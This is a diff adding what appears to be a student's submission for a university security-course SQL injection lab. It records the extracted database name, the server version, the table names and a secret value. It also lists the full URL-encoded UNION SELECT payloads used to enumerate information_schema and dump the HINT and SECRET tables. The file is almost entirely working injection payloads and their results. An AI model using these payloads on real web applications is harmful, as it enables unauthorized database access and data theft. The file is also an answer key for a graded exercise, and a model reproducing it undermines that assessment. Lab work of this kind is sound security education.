@@ -1,0 +1,13 @@
+DB_name:proj2_inject3
+version_name:5.5.59-0ubuntu0.14.04.1
+Tables:HINT SECRET foo inject3_users 
+Secret:radius
+
+FirstURL:http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+and+1%3D2+union+select+1%2Cdatabase%28%29%2C3%2Cdatabase%28%29%23
+SecondURL:http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+and+1%3D2+union+select+1%2Cversion%28%29%2C3%2Cversion%28%29%23
+ThirdURL:http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+and+1%3D2+union+select+1%2C2%2C3%2CGROUP_CONCAT%28table_name+SEPARATOR+%27+%27%29+from+information_schema.tables+where+table_type%3D%27base+table%27+and+table_schema%3D%27proj2_inject3%27%23
+FourthURL:
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+and+1%3D2+union+select+1%2C2%2C3%2CGROUP_CONCAT%28column_name+SEPARATOR+%27+%27%29+from+information_schema.columns+where+table_name%3D%27SECRET%27%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+and+1%3D2+union+select+1%2C2%2C3%2CGROUP_CONCAT%28column_name+SEPARATOR+%27+%27%29+from+information_schema.columns+where+table_name%3D%27HINT%27%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=1%27+and+1%3D2+union+select+1%2C2%2C3%2CGROUP_CONCAT%28message+SEPARATOR+%27+%27%29+from+HINT%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=+1%27+and+1%3D2+union+select+1%2C2%2C3%2CGROUP_CONCAT%28secret+SEPARATOR+%27+%27%29+from+SECRET+WHERE+hash%3D%22766e1339e24cd2725ff7f1dac1501b3c%22%23
